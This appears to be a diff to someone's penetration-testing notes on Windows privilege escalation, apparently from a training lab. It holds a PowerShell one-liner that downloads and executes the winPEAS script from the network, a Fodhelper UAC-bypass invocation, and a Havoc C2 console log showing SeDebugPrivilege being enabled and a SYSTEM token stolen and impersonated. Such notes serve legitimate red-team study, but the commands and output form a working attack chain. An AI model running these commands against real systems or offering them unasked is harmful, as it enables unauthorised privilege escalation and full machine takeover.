@@ -106,3 +106,34 @@ Priv Esc.
 ```powershell
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
 ```
+
+---
+
+UAC Bypass (admin user -> high integrity) -> PrivsFU -> NT AUTH
+
+---
+
+Example using a vulnerable service running as administrator but not in highest privileges
+
+User student_adm (integrity medium)
+
+```
+import-module .\FodhelperBypass.ps1
+PS C:\Temp>  FodhelperBypass -program "cmd.exe"
+```
+
+Now user in in High Interity - running TokenPlayer (whicj enables sedebugprivilege) will now escalate to system!
+
+
+In havoc, running admin user in high integrity, you still need to set sedebugprivilege in order to use `STEAL TOKEN`:
+```
+04/04/2025 14:05:18 [Threatadmin] Demon » token privs-get SeDebugPrivilege
+[*] [F6CB1E4A] Tasked demon to enable a privilege: SeDebugPrivilege
+[+] Send Task to Agent [41 bytes]
+[+] The privilege SeDebugPrivilege was successfully enabled
+
+04/04/2025 14:05:31 [Threatadmin] Demon » token steal 4536
+[*] [20765EC8] Tasked demon to steal a process token
+[+] Send Task to Agent [24 bytes]
+[+] Successful stole and impersonated token from 4536 User:[NT AUTHORITY\SYSTEM] TokenID:[0]
+```
